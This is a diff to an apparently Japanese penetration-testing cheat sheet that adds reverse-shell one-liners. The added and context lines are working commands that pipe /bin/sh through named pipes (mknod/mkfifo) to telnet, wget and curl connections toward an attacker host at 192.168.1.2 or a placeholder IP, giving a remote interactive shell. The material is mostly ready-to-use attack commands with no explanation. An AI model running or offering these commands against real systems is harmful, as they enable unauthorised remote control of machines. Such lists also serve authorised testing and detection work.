@@ -178,6 +178,12 @@ mknod /tmp/p p && telnet 192.168.1.2 4443 0</tmp/p | /bin/ash 1>/tmp/p
 # ターゲット側（攻撃者へ接続を発信）
 mknod /tmp/p p && telnet <攻撃者IP> 4444 0</tmp/p | /bin/sh 1>/tmp/p
 
+telnetとmkinfoがある場合
+
+rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/sh -i 2>&1 | telnet <接続先IP> <ポート番号> > /tmp/p
+
+telnetがある場合
+telnet 192.168.1.2 4444 | /bin/sh | telnet 192.168.1.2 4445
 --------------------------------------------------------------------------------------------
 
 なんでもうけとる
@@ -193,4 +199,4 @@ wget / curl のパイプ渡し
 wget または curl が存在する場合、FIFO（mknod）を使ってシェル出力を攻撃者側に送信
 
 mknod /tmp/p p && /bin/sh 0</tmp/p | wget --post-data=- -q -O - http://192.168.1.2:4444 >/tmp/p
-
+mknod /tmp/p p && /bin/sh 0</tmp/p 2>&1 | curl -T - -N http://192.168.1.2:4444 >/tmp/p
